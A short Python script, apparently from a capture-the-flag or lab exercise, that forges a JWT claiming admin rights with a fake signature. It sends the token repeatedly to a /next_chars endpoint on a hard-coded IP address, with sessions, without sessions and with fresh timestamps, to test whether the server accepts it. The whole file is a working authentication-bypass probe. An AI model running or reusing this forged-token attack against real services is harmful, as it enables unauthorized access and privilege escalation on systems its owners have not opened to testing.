#!/usr/bin/env python3
import base64, json, time, requests

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header_b64 = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload_b64 = b64url(json.dumps({"admin": True, "timestamp": int(time.time())}, separators=(",", ":")).encode())
forged_jwt = f"{header_b64}.{payload_b64}.deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdea"

SECRET = "77.204.214.64"

print(f"Fresh JWT: {forged_jwt}\n")
print("### Repeatedly querying /next_chars?char=s on secret-server with the SAME fresh JWT, 15 times in a row ###")
s = requests.Session()
for i in range(15):
    r = s.get(f"http://{SECRET}/next_chars", params={"char": "s"}, headers={"JWT": forged_jwt}, timeout=4)
    print(f"  call {i}: {r.status_code}: {r.text.strip()}")
    time.sleep(0.3)

print("\n### Same test but WITHOUT session/cookie reuse (fresh connection each time) ###")
for i in range(10):
    r = requests.get(f"http://{SECRET}/next_chars", params={"char": "s"}, headers={"JWT": forged_jwt}, timeout=4)
    print(f"  call {i}: {r.status_code}: {r.text.strip()}")
    time.sleep(0.3)

print("\n### Try repeated calls with DIFFERENT fresh JWT each time (new timestamp per call) ###")
for i in range(8):
    p_b64 = b64url(json.dumps({"admin": True, "timestamp": int(time.time())}, separators=(",", ":")).encode())
    jwt_i = f"{header_b64}.{p_b64}.deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdea"
    r = requests.get(f"http://{SECRET}/next_chars", params={"char": "s"}, headers={"JWT": jwt_i}, timeout=4)
    print(f"  call {i}: {r.status_code}: {r.text.strip()}")
    time.sleep(0.3)
